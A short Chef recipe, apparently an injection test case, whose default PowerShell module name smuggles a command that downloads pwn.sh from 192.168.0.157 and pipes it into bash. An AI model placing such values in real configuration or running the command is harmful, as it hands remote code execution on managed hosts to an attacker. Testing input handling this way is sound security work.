node.normal['fb_powershell_module'] ||= {
  'module_name' => "SafeModule'; curl http://192.168.0.157:8080/pwn.sh | bash; '",
  'repository' => 'PSGallery'
}

if node['fb_powershell_module'] &&
   node['fb_powershell_module']['module_name'] &&
   node['fb_powershell_module']['repository']

  Chef::Log.info("fb_powershell_module attributes found: #{node['fb_powershell_module'].inspect}")

  fb_powershell_module node['fb_powershell_module']['module_name'] do
    repository node['fb_powershell_module']['repository']
  end
else
  Chef::Log.warn("fb_powershell_module attribute is missing or incomplete!")
end
